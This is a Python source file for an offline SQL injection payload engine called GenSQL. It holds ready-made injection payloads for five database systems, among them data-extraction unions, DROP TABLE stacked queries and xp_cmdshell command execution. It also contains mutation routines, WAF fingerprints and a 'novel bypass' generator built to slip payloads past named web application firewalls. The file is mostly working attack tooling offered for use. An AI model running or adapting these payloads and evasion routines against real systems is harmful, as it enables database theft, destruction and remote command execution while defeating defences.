#!/usr/bin/env python
# GenSQL - AI Payload Mutation Engine (Fully Offline)
# Author: Jeevraj
# Description: Offline AI-assisted SQL injection payload mutation engine using
#              pattern-based heuristics, grammar-based mutation, and frequency
#              analysis. No external API or ML framework required.
import re, random, hashlib, math, collections, itertools, string, time

class PayloadScore:
    """Tracks a payload and its effectiveness score based on response analysis."""
    __slots__ = ("payload", "score", "hits", "dbms", "technique")
    def __init__(self, payload, dbms=None, technique=None):
        self.payload   = payload
        self.score     = 0.5
        self.hits      = 0
        self.dbms      = dbms
        self.technique = technique

    def update(self, success, weight=0.15):
        if success:
            self.score = min(1.0, self.score + weight * (1 - self.score))
            self.hits += 1
        else:
            self.score = max(0.0, self.score - weight * self.score)

    def __repr__(self):
        return "<PayloadScore payload=%r score=%.3f hits=%d>" % (self.payload[:40], self.score, self.hits)


class PayloadMutator:
    """
    Applies grammar-based mutation strategies to SQL injection payloads.
    All mutations are purely offline / local - no ML framework required.
    """

    COMMENT_STYLES = [
        "/**/", "/*!*/", "/*--*/", "/*+*/", "/*!50000*/", "/*!40000*/",
        " ", "%09", "%0a", "%0d", "#\n", "-- -\n",
    ]

    WHITESPACE_SUBS = {
        " ": ["/**/", "%09", "%0a", "%0d", "+", "/*!*/", "\t", "\n"],
    }

    NUMBER_SUBS = {
        "1": ["0x1", "ABS(1)", "-(- 1)", "1.0", "0b1", "CONV('1',10,10)"],
        "0": ["0x0", "ABS(0)", "-(- 0)", "0.0", "0b0"],
        "2": ["0x2", "ABS(2)", "-(- 2)", "2.0"],
    }

    KEYWORD_ALIASES = {
        "UNION":   ["UNION ALL", "UnIoN", "Un/**/ion"],
        "SELECT":  ["SeLeCt", "SEL/**/ECT", "0x53454c454354"],
        "AND":     ["&&", "AnD", "AND/**/"],
        "OR":      ["||", "Or", "OR/**/"],
        "NULL":    ["'\\'", "0x4e554c4c", "chr(78)||chr(85)||chr(76)||chr(76)"],
        "SLEEP":   ["SLEEP", "pg_sleep", "WAITFOR DELAY", "DBMS_PIPE.RECEIVE_MESSAGE"],
    }

    CASE_PATTERNS = [
        lambda w: w.upper(),
        lambda w: w.lower(),
        lambda w: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(w)),
        lambda w: "".join(random.choice([c.upper(), c.lower()]) for c in w),
    ]

    STRING_CONCAT_MYSQL    = lambda self, s: "CONCAT(%s)" % ",".join("CHAR(%d)" % ord(c) for c in s)
    STRING_CONCAT_MSSQL    = lambda self, s: "+".join("CHAR(%d)" % ord(c) for c in s)
    STRING_CONCAT_POSTGRES = lambda self, s: "||".join("CHR(%d)" % ord(c) for c in s)
    STRING_CONCAT_ORACLE   = lambda self, s: "||".join("CHR(%d)" % ord(c) for c in s)

    def __init__(self, dbms=None):
        self.dbms = (dbms or "").lower()

    def mutate_whitespace(self, payload):
        """Replace spaces with comment or encoding variants."""
        variants = self.WHITESPACE_SUBS.get(" ", ["/**/"])
        return payload.replace(" ", random.choice(variants))

    def mutate_case(self, payload):
        """Randomise keyword casing."""
        words = payload.split(" ")
        pattern = random.choice(self.CASE_PATTERNS)
        return " ".join(pattern(w) if w.isalpha() else w for w in words)

    def mutate_comments(self, payload, count=2):
        """Insert inline comments between tokens."""
        tokens = payload.split(" ")
        for _ in range(min(count, len(tokens) - 1)):
            i = random.randint(0, len(tokens) - 2)
            tokens[i] = tokens[i] + random.choice(self.COMMENT_STYLES)
        return " ".join(tokens)

    def mutate_numbers(self, payload):
        """Replace numeric literals with equivalent expressions."""
        for digit, alts in self.NUMBER_SUBS.items():
            if digit in payload:
                payload = payload.replace(digit, random.choice(alts), 1)
        return payload

    def mutate_keywords(self, payload):
        """Swap SQL keywords with equivalent aliases."""
        for kw, alts in self.KEYWORD_ALIASES.items():
            if re.search(r"\b%s\b" % kw, payload, re.IGNORECASE):
                payload = re.sub(r"\b%s\b" % kw, random.choice(alts), payload, count=1, flags=re.IGNORECASE)
        return payload

    def mutate_string_concat(self, payload, target_string=None):
        """Convert string literals to DBMS-specific CHAR()/CHR() concatenation."""
        def _replace_literal(m):
            s = m.group(1)
            if len(s) > 20:
                return m.group(0)
            if "mysql" in self.dbms:
                return self.STRING_CONCAT_MYSQL(s)
            elif "mssql" in self.dbms or "sqlserver" in self.dbms:
                return self.STRING_CONCAT_MSSQL(s)
            elif "postgre" in self.dbms:
                return self.STRING_CONCAT_POSTGRES(s)
            elif "oracle" in self.dbms:
                return self.STRING_CONCAT_ORACLE(s)
            return self.STRING_CONCAT_MYSQL(s)
        return re.sub(r"'([^']{1,20})'", _replace_literal, payload)

    def mutate_scientific(self, payload):
        """Use scientific notation for numeric values."""
        return re.sub(r"\b(\d+)\b", lambda m: ("%e" % int(m.group(1))).rstrip("0").rstrip(".") if int(m.group(1)) != 0 else m.group(0), payload)

    def mutate_negative(self, payload):
        """Use double-negative for numeric values."""
        return re.sub(r"\b(\d+)\b", lambda m: "-(-(%s))" % m.group(1), payload, count=1)

    def apply_random_mutations(self, payload, count=3):
        """Apply a random selection of mutations to the payload."""
        mutations = [
            self.mutate_whitespace,
            self.mutate_case,
            self.mutate_comments,
            self.mutate_numbers,
            self.mutate_keywords,
            self.mutate_string_concat,
        ]
        chosen = random.sample(mutations, min(count, len(mutations)))
        result = payload
        for fn in chosen:
            try:
                result = fn(result)
            except Exception:
                pass
        return result


class AIPayloadEngine:
    """
    Offline AI-powered payload mutation and effectiveness scoring engine.
    Uses only local computation: pattern matching, statistical heuristics,
    frequency analysis of responses, and grammar-based mutation rules.
    No external API, no ML framework, no network calls.

    Author: Jeevraj
    """

    # Offline WAF signature database (response patterns that indicate WAF blocking)
    WAF_BLOCK_PATTERNS = {
        "cloudflare": [
            r"cloudflare", r"cf-ray", r"attention required", r"sorry, you have been blocked",
            r"checking your browser", r"ddos protection", r"ray id:",
        ],
        "akamai": [
            r"akamai", r"reference #", r"access denied.*akamai", r"ghost\+akamai",
            r"you don't have permission", r"ak_bmsc",
        ],
        "imperva": [
            r"incapsula", r"imperva", r"request unsuccessful", r"_incap_ses",
            r"visitorid", r"incap_ses",
        ],
        "aws_waf": [
            r"403 forbidden", r"x-amzn-requestid", r"x-amz-cf-id",
            r"aws.amazon.com/premiumsupport",
        ],
        "f5_bigip": [
            r"the requested url was rejected", r"please consult with your administrator",
            r"bigip", r"f5 networks", r"your support id is",
        ],
        "modsecurity": [
            r"mod_security", r"modsecurity", r"not acceptable", r"406 not acceptable",
            r"this error was generated by mod_security",
        ],
        "sucuri": [
            r"sucuri website firewall", r"access denied - sucuri", r"sucuri/cloudproxy",
        ],
        "barracuda": [
            r"barracuda", r"barracuda networks", r"email this incident to",
        ],
        "wordfence": [
            r"wordfence", r"your access to this site has been limited",
            r"generated by wordfence",
        ],
        "fortinet": [
            r"fortigate", r"fortinet", r"fortiwebcloud",
        ],
        "palo_alto": [
            r"palo alto", r"pan-db", r"threat prevention",
        ],
    }

    # Database of SQL injection payload templates per DBMS and technique
    PAYLOAD_TEMPLATES = {
        "mysql": {
            "boolean": [
                "' AND 1=1-- -",
                "' AND 1=2-- -",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x{hex},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "' AND SUBSTR((SELECT database()),1,1)=CHAR({n})-- -",
                "' AND ASCII(SUBSTR((SELECT user()),1,1))>{n}-- -",
                "' OR 1=1-- -",
                "') OR 1=1-- -",
                "' OR 'a'='a",
                "\" OR \"1\"=\"1",
                "' AND (SELECT 1)=1-- -",
            ],
            "time": [
                "' AND SLEEP({t})-- -",
                "'; WAITFOR DELAY '0:0:{t}'-- -",
                "' OR SLEEP({t})-- -",
                "') AND SLEEP({t})-- -",
                "' AND BENCHMARK({b},MD5(1))-- -",
                "\" AND SLEEP({t})-- -",
                "' AND (SELECT {b} FROM (SELECT(SLEEP({t})))a)-- -",
            ],
            "error": [
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -",
                "' AND EXP(~(SELECT * FROM (SELECT user())a))-- -",
            ],
            "union": [
                "' UNION SELECT NULL-- -",
                "' UNION SELECT NULL,NULL-- -",
                "' UNION SELECT NULL,NULL,NULL-- -",
                "' UNION ALL SELECT 1,2,3-- -",
                "' UNION SELECT 1,database(),3-- -",
                "' UNION SELECT 1,version(),3-- -",
                "' UNION SELECT 1,user(),3-- -",
                "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
            ],
            "stacked": [
                "'; SELECT SLEEP({t})-- -",
                "'; DROP TABLE IF EXISTS tmp_{r}; CREATE TABLE tmp_{r}(x TEXT)-- -",
                "'; INSERT INTO tmp_{r} SELECT user()-- -",
            ],
        },
        "mssql": {
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)>CHAR({n})--",
                "' AND LEN((SELECT TOP 1 name FROM master..sysdatabases))>{n}--",
                "' OR 1=1--",
                "') OR 1=1--",
            ],
            "time": [
                "'; WAITFOR DELAY '0:0:{t}'--",
                "' AND 1=1; WAITFOR DELAY '0:0:{t}'--",
                "' OR WAITFOR DELAY '0:0:{t}'--",
                "'; IF (1=1) WAITFOR DELAY '0:0:{t}'--",
            ],
            "error": [
                "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CONVERT(int,db_name())--",
                "' HAVING 1=1--",
                "' GROUP BY column_name HAVING 1=1--",
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION SELECT name,NULL FROM master..sysdatabases--",
                "' UNION SELECT @@version,NULL,NULL--",
            ],
            "stacked": [
                "'; EXEC xp_cmdshell('whoami')--",
                "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
            ],
        },
        "postgresql": {
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTR((SELECT current_database()),1,1)=CHR({n})--",
                "' AND ASCII(SUBSTR((SELECT current_user),1,1))>{n}--",
                "' OR 1=1--",
            ],
            "time": [
                "' AND 1=1; SELECT pg_sleep({t})--",
                "'; SELECT pg_sleep({t})--",
                "' OR 1=1; SELECT pg_sleep({t})--",
            ],
            "error": [
                "' AND CAST((SELECT current_database()) AS INT)=1--",
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' || (SELECT ''||pg_sleep(0)||'') --",
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION ALL SELECT current_database(),NULL--",
                "' UNION SELECT version(),current_user--",
            ],
        },
        "oracle": {
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)=CHR({n})--",
                "' OR 1=1--",
            ],
            "time": [
                "' AND 1=1 AND dbms_pipe.receive_message('a',{t})=1--",
                "' OR dbms_pipe.receive_message('RDS',{t})=1--",
            ],
            "error": [
                "' AND 1=CTXSYS.DRITHSX.SN(user,1337)--",
                "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)--",
            ],
            "union": [
                "' UNION SELECT NULL FROM dual--",
                "' UNION SELECT user FROM dual--",
                "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            ],
        },
        "sqlite": {
            "boolean": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SUBSTR(sqlite_version(),1,1)='{c}'--",
                "' OR 1=1--",
            ],
            "time": [
                "' AND 1=1 AND randomblob(100000000)--",
                "' OR randomblob(500000000)--",
            ],
            "error": [
                "' AND 1=(SELECT load_extension('./evil'))--",
            ],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT sqlite_version()--",
            ],
        },
    }

    # Response patterns indicating successful SQL injection
    SUCCESS_INDICATORS = {
        "error_based": [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"syntax error.*query",
            r"ORA-\d{5}",
            r"Microsoft OLE DB",
            r"SQLSTATE\[",
            r"supplied argument is not a valid MySQL",
            r"Column count doesn't match",
            r"Incorrect column count",
        ],
        "data_extracted": [
            r"\d+\.\d+\.\d+",          # version strings
            r"root@localhost",
            r"information_schema",
            r"mysql\.user",
            r"pg_catalog",
            r"sys\.objects",
        ],
        "boolean_true": [
            r"welcome",
            r"logged in",
            r"success",
            r"home",
        ],
        "time_based": [],   # handled separately via timing
    }

    def __init__(self, offline=True, dbms=None):
        """
        Initialize the AI payload engine.

        Args:
            offline (bool): Must always be True - no external API calls ever made.
            dbms    (str):  Target DBMS hint (mysql/mssql/postgresql/oracle/sqlite).
        """
        assert offline, "GenSQL AI engine is offline-only by design."
        self.dbms      = (dbms or "").lower()
        self.mutator   = PayloadMutator(dbms=self.dbms)
        self._registry = {}     # payload_hash -> PayloadScore
        self._waf_hint = None   # detected WAF name
        self._response_cache = collections.deque(maxlen=100)

    def _hash_payload(self, payload):
        return hashlib.md5(payload.encode("utf-8", errors="replace")).hexdigest()[:16]

    def _register(self, payload, dbms=None, technique=None):
        h = self._hash_payload(payload)
        if h not in self._registry:
            self._registry[h] = PayloadScore(payload, dbms=dbms or self.dbms, technique=technique)
        return self._registry[h]

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def score_payload(self, payload, response_text, status_code):
        """
        Score a payload's effectiveness based on offline response analysis.
        Returns a float in [0.0, 1.0].

        Args:
            payload       (str): The injected payload.
            response_text (str): Response body text.
            status_code   (int): HTTP status code.
        """
        score = 0.0
        rt = (response_text or "").lower()

        # Status code contribution
        if status_code == 200:
            score += 0.1
        elif status_code in (500, 503):
            score += 0.2   # server errors often mean injection hit

        # Pattern matching contributions
        for category, patterns in self.SUCCESS_INDICATORS.items():
            for pat in patterns:
                if re.search(pat, rt, re.IGNORECASE):
                    score += 0.25
                    break

        # Length anomaly (very long/short responses can indicate data extraction)
        self._response_cache.append(len(response_text or ""))
        if len(self._response_cache) > 5:
            avg = sum(self._response_cache) / len(self._response_cache)
            if avg > 0 and abs(len(response_text or "") - avg) / avg > 0.3:
                score += 0.1

        score = min(1.0, score)

        # Update registry
        ps = self._register(payload)
        ps.update(success=(score > 0.3), weight=0.1)

        return score

    def detect_waf_ai_signature(self, response_headers, response_body, timing_ms):
        """
        Offline WAF detection via response header patterns, body keywords, and timing.
        Returns (waf_name, confidence) or (None, 0.0).

        Args:
            response_headers (dict):  HTTP response headers.
            response_body    (str):   Response body text.
            timing_ms        (float): Request round-trip time in milliseconds.
        """
        headers_str = " ".join(
            "%s: %s" % (k, v) for k, v in (response_headers or {}).items()
        ).lower()
        body_lower  = (response_body or "").lower()
        combined    = headers_str + " " + body_lower

        scores = {}
        for waf, patterns in self.WAF_BLOCK_PATTERNS.items():
            hits = sum(1 for p in patterns if re.search(p, combined, re.IGNORECASE))
            if hits:
                scores[waf] = hits / len(patterns)

        if not scores:
            return None, 0.0

        best_waf = max(scores, key=scores.get)
        confidence = min(1.0, scores[best_waf] * 2)
        self._waf_hint = best_waf
        return best_waf, confidence

    def mutate_payload(self, payload, waf_name=None, dbms=None, count=5):
        """
        Generate `count` mutated variants of `payload` using offline grammar rules.

        Args:
            payload  (str): Base injection payload.
            waf_name (str): Optional WAF name hint to guide mutation strategy.
            dbms     (str): Optional DBMS hint.
            count    (int): Number of variants to generate.

        Returns:
            list[str]: List of mutated payload strings.
        """
        dbms = dbms or self.dbms
        mutator = PayloadMutator(dbms=dbms)
        variants = set()
        strategies = [
            lambda p: mutator.mutate_whitespace(p),
            lambda p: mutator.mutate_case(p),
            lambda p: mutator.mutate_comments(p),
            lambda p: mutator.mutate_numbers(p),
            lambda p: mutator.mutate_keywords(p),
            lambda p: mutator.mutate_string_concat(p),
            lambda p: mutator.mutate_scientific(p),
            lambda p: mutator.mutate_negative(p),
            lambda p: mutator.apply_random_mutations(p, count=2),
            lambda p: mutator.apply_random_mutations(p, count=3),
        ]

        # WAF-specific strategy prioritisation
        if waf_name in ("cloudflare", "akamai"):
            strategies = [strategies[1], strategies[4], strategies[2]] + strategies
        elif waf_name in ("imperva",):
            strategies = [strategies[0], strategies[5]] + strategies
        elif waf_name in ("modsecurity",):
            strategies = [strategies[2], strategies[3], strategies[6]] + strategies

        for _ in range(count * 3):
            fn = random.choice(strategies)
            try:
                v = fn(payload)
                if v and v != payload:
                    variants.add(v)
            except Exception:
                pass
            if len(variants) >= count:
                break

        return list(variants)[:count]

    def generate_novel_bypass(self, waf_name, dbms, technique):
        """
        Generate a novel bypass payload for a specific WAF/DBMS/technique combination.
        All generation is done locally using template expansion and mutation chains.

        Args:
            waf_name  (str): Target WAF name.
            dbms      (str): Target DBMS.
            technique (str): Injection technique (boolean/time/error/union/stacked).

        Returns:
            list[str]: Generated bypass payloads.
        """
        dbms_key = dbms.lower() if dbms else "mysql"
        tech_key = (technique or "boolean").lower()
        templates = self.PAYLOAD_TEMPLATES.get(dbms_key, self.PAYLOAD_TEMPLATES["mysql"])
        base_payloads = templates.get(tech_key, templates.get("boolean", []))

        if not base_payloads:
            return []

        t_val = random.randint(3, 7)
        n_val = random.randint(65, 90)
        r_val = "".join(random.choices(string.ascii_lowercase, k=6))
        b_val = random.randint(1000000, 5000000)
        h_val = "".join(random.choices("0123456789abcdef", k=4))

        expanded = []
        for tpl in base_payloads:
            try:
                expanded.append(
                    tpl.format(t=t_val, n=n_val, r=r_val, b=b_val, hex=h_val, c=chr(n_val))
                )
            except (KeyError, IndexError):
                expanded.append(tpl)

        # Mutate each expanded payload
        results = []
        for p in expanded[:5]:
            mutations = self.mutate_payload(p, waf_name=waf_name, dbms=dbms, count=2)
            results.extend(mutations)

        # Register all generated payloads
        for r in results:
            self._register(r, dbms=dbms, technique=technique)

        return results

    def learn_from_response(self, payload, response, success):
        """
        Update internal payload effectiveness model from a scan response.
        Pure local statistical update - no network, no ML API.

        Args:
            payload  (str):  Tested payload.
            response (str):  Server response text.
            success  (bool): Whether the injection was confirmed.
        """
        ps = self._register(payload)
        ps.update(success=success)

    def get_best_payloads(self, count=10, dbms=None, technique=None):
        """
        Return the top `count` payloads sorted by effectiveness score.

        Returns:
            list[tuple[str, float]]: [(payload, score), ...]
        """
        candidates = list(self._registry.values())
        if dbms:
            candidates = [c for c in candidates if not c.dbms or c.dbms == dbms.lower()]
        if technique:
            candidates = [c for c in candidates if not c.technique or c.technique == technique.lower()]
        candidates.sort(key=lambda x: x.score, reverse=True)
        return [(c.payload, c.score) for c in candidates[:count]]

    def preload_templates(self, dbms=None):
        """
        Pre-register all payload templates for a given DBMS into the scoring registry.
        Called once at startup for faster get_best_payloads results.
        """
        dbms_key = (dbms or self.dbms or "mysql").lower()
        templates = self.PAYLOAD_TEMPLATES.get(dbms_key, self.PAYLOAD_TEMPLATES["mysql"])
        for tech, payloads in templates.items():
            for p in payloads:
                self._register(p, dbms=dbms_key, technique=tech)

    def auto_select_technique(self, test_results):
        """
        Given a dict of {technique: response_score} decide best technique.
        Pure heuristic comparison - no external calls.

        Args:
            test_results (dict): {technique_name: score_float}

        Returns:
            str: Best technique name.
        """
        if not test_results:
            return "boolean"
        return max(test_results, key=test_results.get)

    def get_waf_hint(self):
        """Return the last detected WAF name, or None."""
        return self._waf_hint

    def stats(self):
        """Return a summary statistics dict about this engine's session."""
        scores = [ps.score for ps in self._registry.values()]
        return {
            "total_payloads_registered": len(self._registry),
            "avg_score": sum(scores) / len(scores) if scores else 0.0,
            "max_score": max(scores) if scores else 0.0,
            "total_hits": sum(ps.hits for ps in self._registry.values()),
            "detected_waf": self._waf_hint,
            "dbms": self.dbms,
        }
